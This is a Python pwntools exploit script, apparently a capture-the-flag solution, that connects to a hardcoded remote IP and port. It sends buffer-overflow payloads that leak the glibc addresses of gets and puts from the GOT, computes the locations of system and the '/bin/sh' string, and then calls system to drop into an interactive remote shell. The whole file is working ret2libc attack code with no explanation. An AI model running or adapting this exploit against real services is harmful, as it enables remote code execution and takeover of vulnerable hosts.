from pwn import *
import sys

def exploit():
	p = remote('45.122.249.68', 10003)

	puts = 0x08048440
	gets_plt = 0x0804b014
	puts_plt = 0x0804b018
	main = 0x08048d69
	
	payload = b'4' + b'\x00'*8
	payload += p32(puts)
	payload += p32(main)
	payload += p32(gets_plt)
	p.recvuntil("Give me your number > \n")
	f = open ('payload', 'wb').write(payload)
	p.sendline(payload)
	#data1 = p.recvuntil("No!\n")
	gets_addr_leak = u32(p.recv(4))
	print("leaked gets glibc : %s " % hex(gets_addr_leak))
	
	payload = b'4' + b'\x00'*8
	payload += p32(puts)
	payload += p32(main)
	payload += p32(puts_plt)
	p.recvuntil("Give me your number > \n")
	f = open ('payload', 'wb').write(payload)
	p.sendline(payload)
	#data1 = p.recvuntil("No!\n")
	puts_addr_leak = u32(p.recv(4))
	print("leaked puts glibc : %s " % hex(puts_addr_leak))
	
	
	libc_system = gets_addr_leak - 0x23f50
	binsh_str = libc_system + 0x11e7bb

	payload = b'4' + b'\x00'*8
	payload += p32(libc_system)
	payload += p32(main)
	payload += p32(binsh_str)
	
	p.sendline(payload)
	p.recvuntil("Give me your number > \n")
	p.interactive()
	p.close()
if __name__ == '__main__':
	exploit()
